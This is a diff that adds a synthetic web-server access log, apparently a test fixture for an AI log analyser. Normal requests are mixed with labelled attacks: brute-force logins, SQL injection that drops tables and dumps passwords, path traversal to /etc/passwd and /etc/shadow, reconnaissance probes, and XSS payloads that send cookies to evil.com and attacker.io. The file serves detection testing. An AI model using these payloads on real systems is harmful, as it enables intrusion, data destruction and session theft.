@@ -1,0 +1,65 @@
+# ── Normal traffic (baseline) ───────────────────────────────────────────────
+192.168.1.10 - alice [18/Mar/2026:08:00:01 +0000] "GET /index.html HTTP/1.1" 200 4523 "https://company.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.11 - bob [18/Mar/2026:08:00:12 +0000] "GET /dashboard HTTP/1.1" 200 8901 "https://company.com/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5)"
+192.168.1.12 - carol [18/Mar/2026:08:01:05 +0000] "POST /api/login HTTP/1.1" 200 312 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+192.168.1.13 - - [18/Mar/2026:08:01:30 +0000] "GET /products HTTP/1.1" 200 6234 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)"
+
+# ── ATTACK 1: SSH / Admin brute-force from Russian IP ───────────────────────
+45.142.212.61 - - [18/Mar/2026:09:15:01 +0000] "POST /admin/login HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:03 +0000] "POST /admin/login HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:05 +0000] "POST /admin/login HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:07 +0000] "POST /admin/login HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:09 +0000] "POST /admin/login HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:11 +0000] "POST /wp-login.php HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:13 +0000] "GET /wp-admin HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:15 +0000] "GET /administrator HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:17 +0000] "GET /phpmyadmin HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:19 +0000] "GET /cpanel HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:21 +0000] "POST /login HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+45.142.212.61 - - [18/Mar/2026:09:15:23 +0000] "POST /admin HTTP/1.1" 401 512 "-" "Mozilla/5.0"
+
+# ── ATTACK 2: SQL Injection from Tor exit node ───────────────────────────────
+185.220.101.42 - - [18/Mar/2026:09:30:10 +0000] "GET /users?id=1' OR '1'='1 HTTP/1.1" 200 2048 "-" "sqlmap/1.7.8#stable"
+185.220.101.42 - - [18/Mar/2026:09:30:14 +0000] "GET /search?q='; DROP TABLE users;-- HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+185.220.101.42 - - [18/Mar/2026:09:30:18 +0000] "GET /api/users?id=1 UNION SELECT username,password,email FROM users-- HTTP/1.1" 200 3072 "-" "sqlmap/1.7.8#stable"
+185.220.101.42 - - [18/Mar/2026:09:30:22 +0000] "GET /products?cat=1 AND SLEEP(5)-- HTTP/1.1" 200 1024 "-" "sqlmap/1.7.8#stable"
+185.220.101.42 - - [18/Mar/2026:09:30:26 +0000] "GET /article?id=1; INSERT INTO admins VALUES('hacker','pwned')-- HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+
+# ── ATTACK 3: Directory traversal / path traversal from scanner ─────────────
+198.50.200.11 - - [18/Mar/2026:09:45:05 +0000] "GET /../../../etc/passwd HTTP/1.1" 403 512 "-" "Nikto/2.1.6"
+198.50.200.11 - - [18/Mar/2026:09:45:09 +0000] "GET /..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 512 "-" "Nikto/2.1.6"
+198.50.200.11 - - [18/Mar/2026:09:45:13 +0000] "GET /../../../../windows/system32/drivers/etc/hosts HTTP/1.1" 403 512 "-" "Nikto/2.1.6"
+198.50.200.11 - - [18/Mar/2026:09:45:17 +0000] "GET /static/../../../etc/mysql/my.cnf HTTP/1.1" 403 512 "-" "Nikto/2.1.6"
+198.50.200.11 - - [18/Mar/2026:09:45:21 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 403 512 "-" "Nikto/2.1.6"
+
+# ── ATTACK 4: XSS injection campaign ────────────────────────────────────────
+203.0.113.45 - - [18/Mar/2026:10:00:05 +0000] "GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+203.0.113.45 - - [18/Mar/2026:10:00:09 +0000] "GET /comment?text=<img src=x onerror=alert(document.cookie)> HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+203.0.113.45 - - [18/Mar/2026:10:00:13 +0000] "POST /profile HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+203.0.113.45 - - [18/Mar/2026:10:00:17 +0000] "GET /bio?name=<svg onload=fetch('https://attacker.io/?x='+btoa(document.cookie))> HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+
+# ── ATTACK 5: Automated vulnerability scan / reconnaissance ─────────────────
+77.88.55.99 - - [18/Mar/2026:10:15:00 +0000] "GET /.env HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:03 +0000] "GET /.git/config HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:06 +0000] "GET /wp-config.php HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:09 +0000] "GET /config.php.bak HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:12 +0000] "GET /backup.sql HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:15 +0000] "GET /database.sql HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:18 +0000] "GET /dump.sql HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:21 +0000] "GET /phpinfo.php HTTP/1.1" 200 48291 "-" "Mozilla/5.0"
+77.88.55.99 - - [18/Mar/2026:10:15:24 +0000] "GET /server-status HTTP/1.1" 200 4096 "-" "Mozilla/5.0"
+
+# ── ATTACK 6: Second brute-force wave (different IP) ────────────────────────
+91.240.118.172 - - [18/Mar/2026:10:30:00 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+91.240.118.172 - - [18/Mar/2026:10:30:02 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+91.240.118.172 - - [18/Mar/2026:10:30:04 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+91.240.118.172 - - [18/Mar/2026:10:30:06 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+91.240.118.172 - - [18/Mar/2026:10:30:08 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+91.240.118.172 - - [18/Mar/2026:10:30:10 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+91.240.118.172 - - [18/Mar/2026:10:30:12 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+91.240.118.172 - - [18/Mar/2026:10:30:14 +0000] "POST /api/auth HTTP/1.1" 401 256 "-" "python-requests/2.28.0"
+
+# ── Normal traffic continues (shows AI correctly ignores benign requests) ────
+10.0.0.5 - dave [18/Mar/2026:10:45:00 +0000] "GET /api/products HTTP/1.1" 200 15230 "-" "Mozilla/5.0"
+10.0.0.6 - eve [18/Mar/2026:10:45:10 +0000] "POST /api/checkout HTTP/1.1" 200 890 "-" "Mozilla/5.0"
+10.0.0.7 - frank [18/Mar/2026:10:45:20 +0000] "GET /images/logo.png HTTP/1.1" 200 23401 "-" "Mozilla/5.0"
